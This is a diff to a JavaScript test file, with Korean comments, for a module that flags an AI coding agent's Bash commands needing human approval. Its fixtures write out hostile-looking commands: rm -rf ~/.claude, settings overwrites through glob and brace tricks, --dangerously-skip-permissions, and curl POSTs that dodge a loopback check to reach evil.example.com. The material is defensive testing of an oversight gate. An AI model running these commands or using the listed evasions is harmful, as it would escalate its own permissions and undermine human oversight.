@@ -30,7 +30,7 @@ import {
   validateEnforceConfig,
 } from '../../lib/security/human-gate-enforce.js';
 import { classify, getGateRow, HUMAN_GATE_MATRIX } from '../../lib/security/human-gates.js';
-import { findUnboundedRuns } from '../helpers/regex-scan.js';
+import { curlProvenLoopbackOnly, shellWords } from '../../lib/security/human-gate-curl.js';
 
 // ── 픽스처 경로 ────────────────────────────────────────────────────────────
 // Windows 경로는 조각으로 조립한다(land 인용 게이트가 드라이브+사용자 폴더 리터럴을 거부).
@@ -75,6 +75,16 @@ const HG12_POSITIVE = [
   ['Bash 리다이렉트 뒤 체인 — $ 앵커 classify 가 놓치는 형', { tool: 'Bash', command: 'echo {} > ~/.claude/settings.json && echo done' }],
   ['Bash --dangerously-skip-permissions', { tool: 'Bash', command: 'claude --dangerously-skip-permissions -p "hi"' }],
   ['Bash 백슬래시 경로로 cp', { tool: 'Bash', command: `cp x.json ${win(...HOME, '.claude', 'dispatch-table.json')}` }],
+  // review2 수리 라운드 1 (2026-09-28) — 재현 후 핀
+  ['B4 glob basename', { tool: 'Bash', command: 'cp p ~/.claude/settings.js?n' }],
+  ['B4 brace basename', { tool: 'Bash', command: 'tee ~/.claude/settings.jso{n,}' }],
+  ['B5 cd .claude (끝 슬래시 없음) 뒤 맨 이름', { tool: 'Bash', command: 'cd ~/.claude && cp p settings.json' }],
+  ['B5 worktree 접두 뒤 .. 로 .claude 복귀', { tool: 'Bash', command: 'cd ~/.claude/worktrees/x/../.. && cp p settings.json' }],
+  ['B6 cp -r 로 .claude 디렉터리에 쓰기', { tool: 'Bash', command: 'cp -r p/. ~/.claude/' }],
+  ['B6 tar -C .claude', { tool: 'Bash', command: 'tar -xf p.tar -C ~/.claude' }],
+  ['B6 mv .claude', { tool: 'Bash', command: 'mv ~/.claude x' }],
+  ['B6 rm -rf .claude', { tool: 'Bash', command: 'rm -rf ~/.claude' }],
+  ['B6 worktree 자신의 .claude 디렉터리', { tool: 'Bash', command: 'rm -rf .claude/worktrees/x/.claude' }],
 ];
 
 const HG12_NEGATIVE = [
@@ -85,6 +95,15 @@ const HG12_NEGATIVE = [
   ['Bash git diff', { tool: 'Bash', command: 'git diff -- .claude/settings.local.json' }],
   ['Bash grep 로 플래그 검색', { tool: 'Bash', command: 'grep -rn -- --dangerously-skip-permissions docs/' }],
   ['Bash .vscode 로 리다이렉트', { tool: 'Bash', command: 'echo {} > .vscode/settings.json' }],
+];
+
+/** B6 디렉터리 규칙의 거짓 양성 가드 — 읽기·이동 동사이거나 .claude 자체가 대상이 아니다. */
+const DIR_RULE_NEGATIVE = [
+  ['ls .claude', 'ls ~/.claude'],
+  ['cd .claude 뒤 ls', 'cd ~/.claude && ls'],
+  ['du .claude', 'du -sh ~/.claude'],
+  ['worktree 정리 rm -rf .claude/worktrees/x', 'rm -rf .claude/worktrees/x'],
+  ['.claude 하위 디렉터리 ls', 'ls ~/.claude/agents'],
 ];
 
 const HG13_POSITIVE = [
@@ -113,6 +132,19 @@ const HG07_POSITIVE = [
   ['loopback 이어도 --proxy 가 외부', 'curl -X POST --proxy proxy.example.com:3128 http://127.0.0.1/x'],
   ['gh pr merge', 'gh pr merge 12 --squash'],
   ['git push main', 'git push origin main'],
+  // review2 수리 라운드 1 — loopback 은 "전 토큰 증명"일 때만 비보호
+  ['B1 --connect-to 로 외부 재지정', 'curl -X POST --connect-to 127.0.0.1:80:evil.example.com:80 http://127.0.0.1/'],
+  ['B2 192자 넘는 userinfo 뒤 외부 호스트', `curl -X POST http://127.0.0.1:${'a'.repeat(200)}@evil.example.com/`],
+  ['B3 역슬래시 @', 'curl -X POST http://127.0.0.1\\@evil.example.com/'],
+  ['B3 따옴표 잔여 @', 'curl -X POST "http://127.0.0.1"@evil.example.com/'],
+  ['B3 둘째 인자 x@evil', 'curl -X POST http://127.0.0.1/ x@evil.example.com'],
+  ['B3 점 없는 호스트', 'curl -X POST http://127.0.0.1/ intranet'],
+  ['미지 옵션(-K 설정 파일)', 'curl -X POST -K cfg.txt http://127.0.0.1/'],
+  // 부모 리더 보정 (1): 인식 못 한 토큰 1개 = 증명 실패 = 보호 (음성 대조의 짝)
+  ['인식 못 한 비옵션 단어 1개 섞인 loopback', 'curl -X POST http://127.0.0.1/ foo'],
+  ['인식 못 한 무해 옵션(--max-time 5)도 증명 실패', 'curl -X POST --max-time 5 http://127.0.0.1/'],
+  ['따옴표 없는 개행 뒤 둘째 명령', 'curl -X POST http://127.0.0.1/\nrm -rf x'],
+  ['체인 — 둘째 세그먼트', 'curl -X POST http://127.0.0.1/ && curl -d x https://evil.example.com'],
 ];
 
 const HG07_NEGATIVE = [
@@ -121,6 +153,9 @@ const HG07_NEGATIVE = [
   ['IPv6 ::1', `curl -X POST 'http://[::1]:8080/x'`],
   ['127/8 대역 + -o 출력 파일', 'curl -X POST http://127.1.2.3/x -o out.json'],
   ['grep 인용 gh pr merge', 'grep -rn "gh pr merge" docs'],
+  ['무인자 플래그 묶음 -sS·-k', 'curl -sS -k -X POST http://127.0.0.1:8080/hook'],
+  ['값 붙은 짧은 옵션 -XPOST', 'curl -XPOST http://localhost/x'],
+  ['--data= 값 형', "curl -X POST --data='{}' https://127.0.0.1/x"],
 ];
 
 describe('decideHumanGate — HG-12 권한 상승 표', () => {
@@ -134,6 +169,15 @@ describe('decideHumanGate — HG-12 권한 상승 표', () => {
     const result = decide(input);
     expect(hitIds(result)).toContain('HG-12');
     expect(result.decision).toBe('record');
+  });
+
+  it.each(DIR_RULE_NEGATIVE)('B6 디렉터리 규칙 음성: %s → 강제 안 함', (_label, command) => {
+    expect(['pass', 'record']).toContain(decide({ tool: 'Bash', command }).decision);
+  });
+
+  it('못 보는 것 핀: cd 와 맨 이름 사이가 192자 창을 넘으면 놓친다', () => {
+    const command = `cd ~/.claude && echo ${'x'.repeat(200)} && cp p settings.json`;
+    expect(['pass', 'record']).toContain(decide({ tool: 'Bash', command }).decision);
   });
 });
 
@@ -176,6 +220,51 @@ describe('decideHumanGate — HG-07 외부 시스템 쓰기 표', () => {
   });
 });
 
+describe('human-gate-curl — loopback 증명 (allowlist, fail-closed)', () => {
+  it.each([
+    ['기본', 'curl -X POST http://127.0.0.1'],
+    ['https + 포트 + 경로', 'curl -X POST https://localhost:8443/a/b'],
+    ['[::1] 따옴표', "curl -X POST 'http://[::1]:8080/x'"],
+    ['맨 호스트:포트', 'curl -X POST 127.0.0.1:3000/hook'],
+    ['값 옵션 값 건너뛰기(따옴표 속 @·공백)', `curl -X POST -H 'Authorization: Bearer a@b' -d "x y" http://127.0.0.1/`],
+    ['플래그 묶음 + 긴 플래그', 'curl -sSk --fail --show-headers -X POST http://127.0.0.1/'],
+  ])('증명됨: %s', (_label, command) => {
+    expect(curlProvenLoopbackOnly(command)).toBe(true);
+  });
+
+  it.each([
+    ['대상 없음', 'curl -X POST'],
+    ['curl 아님', 'wget http://127.0.0.1'],
+    ['앞에 환경변수', 'FOO=1 curl -X POST http://127.0.0.1'],
+    ['인식 못 한 비옵션 단어', 'curl http://127.0.0.1 foo'],
+    ['미지 옵션', 'curl --connect-to a:1:b:2 http://127.0.0.1'],
+    ['userinfo', 'curl http://u@127.0.0.1'],
+    ['스킴 ftp', 'curl ftp://127.0.0.1'],
+    ['포트 비숫자', 'curl http://127.0.0.1:8o/'],
+    ['옥텟 256', 'curl http://127.0.0.256/'],
+    ['0.0.0.0', 'curl http://0.0.0.0/'],
+    ['localhost.', 'curl http://localhost./'],
+    ['큰따옴표 속 $', 'curl "http://127.0.0.1/$X"'],
+    ['짝 없는 따옴표', "curl 'http://127.0.0.1"],
+    ['따옴표 밖 &', 'curl http://127.0.0.1/?a=1&b=2'],
+    ['비문자열', 42],
+    ['-L 리다이렉트 추종 (307/308 이 POST 를 외부로 재전송 가능)', 'curl -L -X POST http://127.0.0.1/'],
+    ['--location 긴 형', 'curl --location -X POST http://127.0.0.1/'],
+    ['--include (curl 8.19 도움말에 없음)', 'curl --include -X POST http://127.0.0.1/'],
+  ])('증명 실패: %s', (_label, command) => {
+    expect(curlProvenLoopbackOnly(command)).toBe(false);
+  });
+
+  it('shellWords — 따옴표 결합·작은따옴표 속 특수문자는 글자, 증명 불가 글자는 null', () => {
+    expect(shellWords(`a"b c"'d$e' f`)).toEqual(['ab cd$e', 'f']);
+    expect(shellWords("''")).toEqual(['']);
+    expect(shellWords('a\\b')).toBeNull();
+    expect(shellWords('a;b')).toBeNull();
+    expect(shellWords('a\nb')).toBeNull();
+    expect(shellWords('a*')).toBeNull();
+  });
+});
+
 describe('Bash 면제 allowlist — 면제를 좁히는 조건', () => {
   it.each([
     ['git diff --output= 는 파일을 쓴다', 'git diff --output=.claude/settings.json'],
@@ -186,6 +275,10 @@ describe('Bash 면제 allowlist — 면제를 좁히는 조건', () => {
     ['명령 치환', 'cat $(echo ~/.claude/settings.json)'],
     ['체인 두 번째 세그먼트', 'cat ~/.claude/settings.json && true'],
     ['allowlist 밖 선두 동사', 'less ~/.claude/settings.json'],
+    // N1 (review2): 경로가 붙은 동사는 allowlist 의 그 프로그램이라는 보장이 없다.
+    ['N1 상대 경로 동사 ./cat', './cat ~/.claude/settings.json'],
+    ['N1 절대 경로 동사 /tmp/x/grep', '/tmp/x/grep foo ~/.claude/settings.json'],
+    ['N1 절대 경로 동사 /usr/bin/cat', '/usr/bin/cat ~/.claude/settings.json'],
   ])('%s → 면제 안 됨(ask)', (_label, command) => {
     const result = decide({ tool: 'Bash', command });
     expect(result.decision).toBe('ask');
@@ -193,7 +286,6 @@ describe('Bash 면제 allowlist — 면제를 좁히는 조건', () => {
   });
 
   it.each([
-    ['경로 붙은 동사', '/usr/bin/cat ~/.claude/settings.json'],
     ['git -C <path> show', 'git -C ../repo show HEAD:.claude/settings.json'],
     ['git --no-pager log', 'git --no-pager log -- .claude/settings.json'],
   ])('%s → 면제(record)', (_label, command) => {
@@ -479,6 +571,15 @@ describe('설정 이상값 — 강제 안 함 + configErrors 노출', () => {
 describe('validateEnforceConfig', () => {
   const valid = { enabled: false, mode: 'shadow', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] };
 
+  it('반환 배열은 frozen 이다 (N3) — validateEnforceConfig 와 evaluateMatrix 모두', () => {
+    for (const enforce of [undefined, null, valid, { ...valid, mode: 'x' }]) {
+      expect(Object.isFrozen(validateEnforceConfig(enforce))).toBe(true);
+    }
+    for (const input of [null, { tool: 'Bash', command: 'terraform apply' }, { tool: 'Bash', command: 'npm -v' }]) {
+      expect(Object.isFrozen(evaluateMatrix(input))).toBe(true);
+    }
+  });
+
   it('정상 설정·부분 설정·부재(undefined)는 위반 0', () => {
     expect(validateEnforceConfig(valid)).toEqual([]);
     expect(validateEnforceConfig({ enabled: true })).toEqual([]);
@@ -566,10 +667,18 @@ const scanPurity = (source) => {
 };
 
 describe('순수성 핀 — I/O·env·시계·난수·node 내장 로딩 0', () => {
-  it('모듈 소스(주석 제거 후)에 금지 토큰이 없다', () => {
-    const source = readFileSync(new URL('../../lib/security/human-gate-enforce.js', import.meta.url), 'utf8');
+  it.each([
+    ['human-gate-enforce.js'],
+    ['human-gate-curl.js'],
+  ])('%s 소스(주석 제거 후)에 금지 토큰이 없다', (file) => {
+    const source = readFileSync(new URL(`../../lib/security/${file}`, import.meta.url), 'utf8');
     expect(source.length).toBeGreaterThan(1000);
     expect(scanPurity(source)).toEqual([]);
+  });
+
+  it('human-gate-curl.js 는 아무것도 import 하지 않는다', () => {
+    const source = readFileSync(new URL('../../lib/security/human-gate-curl.js', import.meta.url), 'utf8');
+    expect(stripComments(source)).not.toMatch(/^\s*import\b/m);
   });
 
   it('스캐너 자기검증 — 깨진 합성 소스에서 각 금지 토큰을 잡는다', () => {
@@ -592,192 +701,5 @@ describe('순수성 핀 — I/O·env·시계·난수·node 내장 로딩 0', () 
     expect(scanPurity('/* process.env */ const x = 1;\n// new Date()\nconst y = 2;')).toEqual([]);
     expect(scanPurity('// process.env\nconst x = process.cwd();')).toEqual(['process.']);
     expect(scanPurity("const u = 'http://x'; const d = new Date();")).toEqual(['Date']);
-  });
-});
-
-// ── ReDoS: 긴 단일 런 스윕 ─────────────────────────────────────────────────
-// 정규식마다 근접-미스 payload(매치하지 않는 형)를 20,480·40,960·122,880B 로 키운다. 핵심
-// 단언은 구조(스캐너 0건)와 종료·결과(false)이고, 벽시계는 6배 구간 성장비(바닥값 4ms)와
-// 느슨한 절대 상한만 둔다. 헬퍼는 tests/security/human-gates.test.js 와 **형식만** 같은
-// 자급형 복사본이다(테스트 파일끼리 import 하지 않는다).
-
-/** 반복 단위로 정확히 bytes 길이의 payload. @param {string} unit @param {number} bytes */
-function fill(unit, bytes) {
-  return unit.repeat(Math.ceil(bytes / unit.length)).slice(0, bytes);
-}
-
-/** fn 을 runs 회 돌린 경과 시간의 중앙값(ms). @param {() => void} fn @param {number} runs */
-function medianMs(fn, runs) {
-  const samples = [];
-  for (let i = 0; i < runs; i += 1) {
-    const started = performance.now();
-    fn();
-    samples.push(performance.now() - started);
-  }
-  samples.sort((a, b) => a - b);
-  return samples[Math.floor(runs / 2)];
-}
-
-/** 성장 게이트의 바닥값(ms). 빠르고 선형인 규칙에서 생 비율이 튀는 것을 막는다. */
-const RATIO_FLOOR_MS = 4;
-
-/** 6배 구간 성장 비율. @param {number} numerator @param {number} denominator */
-function growth(numerator, denominator) {
-  return (numerator + RATIO_FLOOR_MS) / (denominator + RATIO_FLOOR_MS);
-}
-
-/**
- * 길이를 그대로 둔 채 회차 표식을 **꼬리에** 박는다(V8 의 같은 (regex, string) 결과 캐시 회피).
- * human-gates.test.js 는 머리에 박지만, 여기서는 머리 단어(`bypassPreCommitHooks`)와 `^` 앵커
- * 시작 위치를 보존해야 2차식 형이 살아 있으므로 꼬리다. 표식은 슬래시·별표 형이 아니라 `#i#` —
- * 슬래시 표식이 `a:/` 필러 꼬리와 붙어 `://` 를 만들어 URL_AUTHORITY 를 매치시켰다(실측 RED).
- * @param {(n: number) => string} build @param {number} n @param {number} i
- */
-function tagged(build, n, i) {
-  const tag = `#${i}#`;
-  return build(n).slice(0, n - tag.length) + tag;
-}
-
-/**
- * 머리 표식 — 보호 basename 이 꼬리에 있어야 하는 경로 payload 용(꼬리 표식은 basename 을 깬다).
- * @param {(n: number) => string} build @param {number} n @param {number} i
- */
-function headTagged(build, n, i) {
-  const tag = `#${i}#`;
-  return tag + build(n).slice(tag.length);
-}
-
-/** build 를 회차마다 다른 payload 로 3회 돌린 median(ms). payload 는 측정 밖에서 만든다. */
-function medianOverTagged(run, build, n) {
-  const payloads = [0, 1, 2].map((i) => tagged(build, n, i));
-  let cursor = 0;
-  return medianMs(() => {
-    run(payloads[cursor]);
-    cursor += 1;
-  }, payloads.length);
-}
-
-const SIZES = [20_480, 40_960, 122_880];
-
-/** 패턴 id → 근접-미스 payload 빌더들. */
-const NEAR_MISS_BUILDERS = Object.freeze({
-  BASH_HG12_PATH: [(n) => fill('.claude/', n)],
-  BASH_HG13_PATH: [(n) => fill('.claude/', n), (n) => fill('.claude/artibot.config.jso ', n)],
-  SKIP_PERMISSIONS_FLAG: [(n) => fill('--dangerously-skip-permission ', n)],
-  NO_VERIFY_FLAG: [(n) => fill('--no-verif ', n)],
-  BYPASS_HOOKS_TRUE: [
-    (n) => fill('bypassPrePushHooks: tru ', n),
-    (n) => `bypassPreCommitHooks${' '.repeat(n - 21)}x`,
-  ],
-  SHELL_CHAIN_META: [(n) => fill('ab ', n)],
-  TOKEN_SEPARATOR: [(n) => fill('ab', n)],
-  WHITESPACE: [(n) => fill('ab', n)],
-  URL_AUTHORITY: [(n) => fill('x', n), (n) => fill('a:/', n)],
-  BARE_HOST: [(n) => fill('a.', n), (n) => fill('a', n)],
-  BARE_IPV6_HOST: [(n) => `[${fill(':', n - 1)}`],
-  IPV4_LOOPBACK: [(n) => fill('127.', n)],
-});
-
-/** decideHumanGate 전체 경로 payload — HG-13[2] 원본 2차식 형(regex-scan.js 카탈로그 (vi))을 포함한다. */
-const END_TO_END_BUILDERS = Object.freeze({
-  'HG-13[2] 원본 2차식 형: bypassPreCommitHooks + 공백×n': (n) => `bypassPreCommitHooks${' '.repeat(n - 21)}x`,
-  '.claude/ 반복': (n) => fill('.claude/', n),
-  'curl -X POST 반복': (n) => fill('curl -X POST ', n),
-  '--no-verif 반복': (n) => fill('--no-verif ', n),
-  'loopback URL 반복': (n) => fill('http://127.0.0.1 ', n),
-  '도메인 모양 토큰 반복': (n) => fill('a.b ', n),
-  '.claude/worktrees/ 반복': (n) => fill('.claude/worktrees/x', n),
-  // 세그먼트 수 최대화 필러 — 2026-09-28 toPathSegments reduce+spread 2차식의 재현 형
-  // (redos 팀원 실측 isClaudeConfigPath fill('a://') 122,880B 4,570.7ms).
-  'a:// 단일 토큰': (n) => fill('a://', n),
-  'curl -X POST + a:// 단일 토큰': (n) => `curl -X POST ${fill('a://', n - 13)}`,
-  '../ 단일 토큰': (n) => fill('../', n),
-  'a/ 단일 토큰': (n) => fill('a/', n),
-});
-
-/** 보호 basename 을 꼬리에 둔 경로 payload(머리 표식) — 술어가 끝까지 도는 형. */
-const PATH_BUILDERS = Object.freeze({
-  'a:// + settings.json': (n) => `${fill('a://', n - 13)}settings.json`,
-  '../ + .claude/settings.json': (n) => `${fill('../', n - 21)}.claude/settings.json`,
-  'a/ + artibot.config.json': (n) => `${fill('a/', n - 19)}artibot.config.json`,
-  '.claude/worktrees/x/ + hooks.json': (n) => `${fill('.claude/worktrees/x/', n - 10)}hooks.json`,
-  '백슬래시 a\\ + dispatch-table.json': (n) => `${fill('a\\', n - 19)}dispatch-table.json`,
-});
-
-describe('ReDoS — 새 정규식 구조 스캔과 긴 단일 런 스윕', () => {
-  const patternIds = ENFORCE_PATTERNS.map((entry) => entry.id);
-  const patternOf = (id) => ENFORCE_PATTERNS.find((entry) => entry.id === id).pattern;
-
-  it('ENFORCE_PATTERNS 는 동결 배열이고 항목마다 고정 id + RegExp 다', () => {
-    expect(Object.isFrozen(ENFORCE_PATTERNS)).toBe(true);
-    expect(new Set(patternIds).size).toBe(patternIds.length);
-    for (const entry of ENFORCE_PATTERNS) {
-      expect(Object.isFrozen(entry)).toBe(true);
-      expect(Object.keys(entry)).toEqual(['id', 'pattern']);
-      expect(entry.pattern).toBeInstanceOf(RegExp);
-    }
-  });
-
-  it('모든 패턴에 근접-미스 빌더가 등록돼 있다 (새 패턴이 스윕을 빠져나가지 못한다)', () => {
-    expect(Object.keys(NEAR_MISS_BUILDERS).sort()).toEqual([...patternIds].sort());
-  });
-
-  it('빌더는 주장한 바이트 수를 정확히 만들고 회차 표식이 payload 를 바꾼다', () => {
-    for (const build of [...Object.values(NEAR_MISS_BUILDERS).flat(), ...Object.values(END_TO_END_BUILDERS)]) {
-      expect(build(20_480)).toHaveLength(20_480);
-      expect(tagged(build, 20_480, 0)).toHaveLength(20_480);
-      expect(tagged(build, 20_480, 0)).not.toBe(tagged(build, 20_480, 1));
-    }
-  });
-
-  it.each(patternIds)('%s — 창 192 초과 무제한 런 0건 (findUnboundedRuns), g·y 플래그 없음', (id) => {
-    const re = patternOf(id);
-    expect(re.global).toBe(false);
-    expect(re.sticky).toBe(false);
-    expect(findUnboundedRuns(re.source, re.flags)).toEqual([]);
-  });
-
-  it.each(patternIds)('%s — 20KB/40KB/120KB 근접-미스에서 종료·불일치, 6배 성장비 < 18', (id) => {
-    const re = patternOf(id);
-    for (const build of NEAR_MISS_BUILDERS[id]) {
-      for (const n of SIZES) expect(re.test(tagged(build, n, 9))).toBe(false);
-      const [t20480, , t122880] = SIZES.map((n) => medianOverTagged((s) => re.test(s), build, n));
-      expect(t122880).toBeLessThan(1500);
-      expect(growth(t122880, t20480)).toBeLessThan(18);
-    }
-  });
-
-  it.each(Object.keys(END_TO_END_BUILDERS))('decideHumanGate 전체 경로 — %s: 종료, 어휘 안 결정, 6배 성장비 < 18', (label) => {
-    const build = END_TO_END_BUILDERS[label];
-    const run = (command) => decide({ tool: 'Bash', command });
-    expect(ENFORCE_DECISIONS).toContain(run(tagged(build, 122_880, 9)).decision);
-    const [t20480, , t122880] = SIZES.map((n) => medianOverTagged(run, build, n));
-    expect(t122880).toBeLessThan(3000);
-    expect(growth(t122880, t20480)).toBeLessThan(18);
-  });
-
-  /** 머리 표식 payload 로 3회 median(ms). */
-  const medianOverHeadTagged = (run, build, n) => {
-    const payloads = [0, 1, 2].map((i) => headTagged(build, n, i));
-    let cursor = 0;
-    return medianMs(() => {
-      run(payloads[cursor]);
-      cursor += 1;
-    }, payloads.length);
-  };
-
-  it.each(Object.keys(PATH_BUILDERS))('경로 술어·Write/Edit 경로 — %s: 선형(6배 성장비 < 18)', (label) => {
-    const build = PATH_BUILDERS[label];
-    expect(build(20_480)).toHaveLength(20_480);
-    const runs = [
-      (p) => isClaudeConfigPath(p, { pluginRoot: CACHE_ROOT }),
-      (p) => decide({ tool: 'Write', path: p }),
-      (p) => decide({ tool: 'Bash', command: `cp x ${p}` }),
-    ];
-    for (const run of runs) {
-      const [t20480, , t122880] = SIZES.map((n) => medianOverHeadTagged(run, build, n));
-      expect(t122880).toBeLessThan(3000);
-      expect(growth(t122880, t20480)).toBeLessThan(18);
-    }
   });
 });
